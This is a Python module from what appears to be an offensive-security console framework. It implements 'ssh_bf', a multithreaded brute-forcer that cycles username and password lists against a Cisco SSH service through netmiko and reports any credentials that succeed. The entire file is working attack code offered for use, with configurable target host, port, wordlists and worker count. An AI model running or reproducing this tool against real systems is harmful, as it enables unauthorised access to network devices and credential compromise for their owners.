import asyncio
import netmiko
import socket
import concurrent.futures

from pathlib import Path
from paramiko.ssh_exception import SSHException
from src.core.base.BaseModule import BaseModule
from src.core.registry.ModuleRegistry import ModuleRegistry
from src.core.registry.OptionRegistry import OptionRegistry
from prompt_toolkit.shortcuts import PromptSession
from prompt_toolkit.styles import Style

prompt_style = Style.from_dict({"prompt": "ansired bold"})


class SSHModule(BaseModule):

    helper = {
        'name': 'ssh_bf',
        'help': 'This module will attempt to bruteforce Cisco SSH login credentials',
        'usage': 'use ssh_bf'
    }

    options = {
        'module': {
            'host': [
                '10.10.10.3',
                'The IPv4 Address of the Cisco SSH service',
                ''
            ],
            'port': [
                '22',
                'The port number of the Cisco SSH service',
                ''
            ],
            'user_list': [
                'usernames.txt',
                'The username or list containing user names to attempt',
                ''
            ],
            'pass_list': [
                'passwords.txt',
                'The password or list containing passwords to attempt',
                ''
            ],
            'workers': [
                '4',
                'The number of workers to run in parallel',
                ''
            ]
        }
    }

    def __init__(self, command: str, print_queue: asyncio.Queue, console: object):
        super().__init__()
        self.command: str = command
        self.console: object = console
        self.print_queue: asyncio.Queue = print_queue
        self.module_register: ModuleRegistry = ModuleRegistry()
        self.option_register: OptionRegistry = OptionRegistry()
        self.work_queue: asyncio.Queue = asyncio.Queue()
        self.found = False
        self.found_credentials: tuple = ()

    async def main(self) -> None:
        await self.register()
        await self.module_shell()

    @staticmethod
    def return_list_from_file(filename: str) -> list:
        if filename == '':
            return []
        return [x.rstrip() for x in open(filename, encoding='utf8')] if Path(filename).is_file() else [filename]

    async def register(self) -> None:
        self.option_register.register_options(options=self.options)

    async def module_shell(self) -> None:
        session = PromptSession()
        allowed_commands = ['set', 'options', 'run', 'back']
        while True:
            try:
                prompt_text = self.option_register.get_register_value('prompt')
                sub_prompt = f"{prompt_text} [{self.helper['name']}]> "
                data: str = await session.prompt_async(sub_prompt, style=prompt_style)
                if not data or not data.startswith(tuple(allowed_commands)):
                    continue
                if data.startswith(tuple(['back', 'exit'])):
                    raise EOFError
                if data.startswith(tuple(['set', 'options'])):
                    # noinspection PyUnresolvedReferences
                    await self.console.command_interpreter(data)
                if data.startswith(tuple(['run', 'exploit'])):
                    await asyncio.create_task(self.execute())
                    # asyncio.create_task(self.execute())
            except (EOFError, KeyboardInterrupt):
                await self.unregister()
                break

    async def unregister(self) -> None:
        options: dict = self.option_register.get_register_dict()
        if 'module' in options.keys():
            options.pop('module')
            self.option_register.register_options(options)

    async def execute(self) -> None:
        executor = concurrent.futures.ThreadPoolExecutor()
        host: str = self.option_register.get_register_value('host')
        port: str = self.option_register.get_register_value('port')
        user_list: list = self.return_list_from_file(self.option_register.get_register_value('user_list'))
        pass_list: list = self.return_list_from_file(self.option_register.get_register_value('pass_list'))
        workers: str = self.option_register.get_register_value('workers')

        if not all([host, port, user_list, pass_list, workers]):
            await self.print_queue.put(('error', f"module requires all options to be complete before starting.\n"))
            return
        try:
            socket.gethostbyname(host)
            if not 1 <= int(port) <= 65535:
                await self.print_queue.put(('error', f"module port '{port}' is not a valid port number.\n"))
                return
        except socket.error:
            await self.print_queue.put(('error', f"module hostname '{host}' is not valid or could not be resolved.\n"))
            return

        for user in user_list:
            for password in pass_list:
                await self.work_queue.put((user, password))

        device: dict = {
            'host': host,
            'port': port,
            'device_type': 'cisco_ios'
        }

        loop = asyncio.get_running_loop()
        blocking_io = [loop.run_in_executor(executor, self.blocking_io, device, i) for i in range(int(workers))]
        completed, pending = await asyncio.wait(blocking_io)
        _ = [t.result() for t in completed]

        if self.found:
            username, password = self.found_credentials
            self.print_queue.put_nowait(f"\n[Found Credentials] - Username: {username}\tPassword: {password}\n")

    def blocking_io(self, device: dict, wid: int):
        while self.work_queue.empty() is not True:
            username, password = self.work_queue.get_nowait()
            self.print_queue.put_nowait(f'[Worker {wid}] - Trying {username} and {password}')
            self.work_queue.task_done()
            while not self.found:
                try:
                    device.update({'username': username, 'password': password})
                    netmiko.Netmiko(**device)
                    self.print_queue.put_nowait(f"\n==> The credentials {username} - {password} were successful!\n")
                    self.found_credentials = (username, password)
                    self.found = True
                    continue
                except asyncio.queues.QueueEmpty:
                    print("queue empty")
                    return
                except netmiko.NetmikoAuthenticationException:
                    break
                except netmiko.NetMikoTimeoutException:
                    self.print_queue.put_nowait(('error', f"SSH connection timed out"))
                    return
                except EOFError:
                    continue
                except SSHException as e:
                    if "reading ssh protocol banner" in e.__str__().lower():
                        continue
                except socket.error:
                    continue
                except Exception as e:
                    if "reading ssh protocol banner" in e.__str__().lower():
                        continue
